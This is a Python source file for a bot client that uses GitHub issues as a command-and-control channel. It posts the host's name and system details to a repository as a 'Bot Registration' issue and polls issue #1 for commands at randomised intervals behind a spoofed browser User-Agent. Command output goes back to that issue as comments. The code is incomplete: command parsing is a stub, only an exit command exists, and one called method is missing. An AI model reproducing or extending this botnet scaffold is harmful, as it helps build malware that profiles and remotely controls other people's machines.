import requests
import time
import socket
import os
import platform
import uuid
from dotenv import load_dotenv
import json
import random
from datetime import datetime
from queries import *

class Bot:
    def __init__(self, owner, repo, token):
        self.owner = owner
        self.repo = repo
        self.token = token
        self.bot_id = str(uuid.uuid4())[:8]  # Generate unique bot ID
        self.last_checked_issue = 0
        self.poll_interval = random.randint(30, 60)  # Random polling interval
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Authorization': f'token {token}'
        }
        
        self.commands = {
            'exit': self.cmd_exit
        }
    
    def get_system_info(self):
        return {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'machine': platform.machine(),
            'bot_id': self.bot_id,
            'python_version': platform.python_version()
        }
    
    def register_bot(self):
        print(f"registering bot {self.bot_id}")
        system_info = self.get_system_info()
        title = f"Bot Registration: {self.bot_id}"
        body = f"Bot checking in:\n```json\n{json.dumps(system_info, indent=2)}\n```"
        self.create_issue(title, body)

    def create_issue(self, title, body):
        url = f"https://api.github.com/repos/{self.owner}/{self.repo}/issues"
        response = requests.post(
            url,
            json={"title": title, "body": body},
            headers=self.headers
        )
        if response.status_code == 201:
            issue_data = response.json()
            print(f"created issue #{issue_data['number']}: {title}")
            return issue_data['number']
        else:
            print(f"failed to create issue: {response.status_code}")
    
    def check_for_commands(self):
        variables = {
            "owner": self.owner,
            "repo": self.repo,
            "issueNumber": 1  # check issue #1 for commands
        }
        
        url = "https://api.github.com/graphql"
        response = requests.post(
            url,
            json={"query": Q_CHECK_COMMANDS, "variables": variables},
            headers=self.headers
        )
        if response.status_code == 200:
            data = response.json()
            if "data" in data and data["data"]["repository"]["issue"]:
                issue = data["data"]["repository"]["issue"]
                self.process_commands(issue["body"])
                
                for comment in issue["comments"]["nodes"]:
                    comment_time = datetime.fromisoformat(comment["createdAt"].replace("Z", "+00:00"))
                    comment_timestamp = comment_time.timestamp()
                    
                    if comment_timestamp > self.last_checked_issue:
                        self.process_commands(comment["body"])
                        self.last_checked_issue = comment_timestamp
        else:
            print(f"Failed to fetch issues: {response.status_code}")
    
    def process_commands(self, text):
        print("processing commands")
    
    def execute_command(self, command, argument):
        print(f"executing command: {command} with argument: {argument}")
        
        if command in self.commands:
            response = self.commands[command](argument)
            if response:
                comment = f"Bot {self.bot_id} response to `{command}`:\n```\n{response}\n```"
                self.create_issue_comment(1, comment)
        else:
            print(f"Unknown command: {command}")
    
    def cmd_exit(self, arg):
        print("Received exit command. Shutting down...")
        exit(0)
    
    def run(self):
        print(f"starting bot {self.bot_id}")
        self.register_bot()
        
        while True:
            try:
                self.check_for_commands()
                time.sleep(self.poll_interval)
            except KeyboardInterrupt:
                print("bot terminated by user.")
                break
            except Exception as e:
                print(f"error in main loop: {e}")
                time.sleep(self.poll_interval)


if __name__ == "__main__":
    load_dotenv()
    
    bot = Bot(
        os.getenv("GITHUB_NAME"),
        os.getenv("GITHUB_REPO"),
        os.getenv("GITHUB_KEY")
    )
    bot.run()